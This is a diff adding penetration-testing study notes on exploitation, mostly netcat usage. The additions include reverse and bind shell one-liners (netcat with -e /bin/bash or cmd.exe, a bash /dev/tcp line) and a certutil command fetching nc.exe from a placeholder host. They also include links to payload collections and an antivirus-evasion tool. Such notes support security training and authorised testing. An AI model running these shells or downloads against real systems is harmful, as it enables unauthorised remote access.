@@ -15,6 +15,80 @@
 ## The Metasploit Framework (MSF)
 
 ## Exploitation
+### Vulnerability Scanning
+
+### Searching For Exploits
+
+### Fixing Exploits
+
+### Bind and Reverse Shells
+```
+nc -help
+
+-n : do not resolve hostnames
+-v : verbosity, can be used multiple times
+-l : listen
+-p : local port number
+-u : UDP instead of TCP
+-e : execute command
+```
+
+```
+cd /usr/share/windows-resources/binaries/
+python -m SimpleHTTPServer 80
+
+certutil -urlcache -f http://<ip>/nc.exe nc.exe
+nc.exe -h
+```
+- Windows does not have `netcat` by default.
+
+```
+nc -nvlp <port>
+nc -nv <ip> <port>
+
+nc -nvlup <port>
+nc -nvu <ip> <port>
+```
+
+```
+nc -nvlp <port> > received.txt
+nc -nv <ip> <port> < sent.txt
+```
+- Transferring files.
+
+```
+nc -nvlp <port> -e /bin/bash
+nc -nv <ip> <port>
+```
+```
+nc -nvlp <port> -e cmd.exe
+nc -nv <ip> <port>
+```
+- Bind shells.
+
+```
+nc -nvlp <port>
+nc -nv <ip> <port> -e /bin/bash
+```
+```
+nc -nvlp <port>
+nc -nv <ip> <port> -e cmd.exe
+```
+- Reverse shells.
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings
+- https://www.revshells.com/
+
+```
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
+
+### Exploitation Frameworks
+
+### Windows Exploitation
+
+### Linux Exploitation
+
 ### AV Evasion & Obfuscation
 - https://www.shellterproject.com/
 
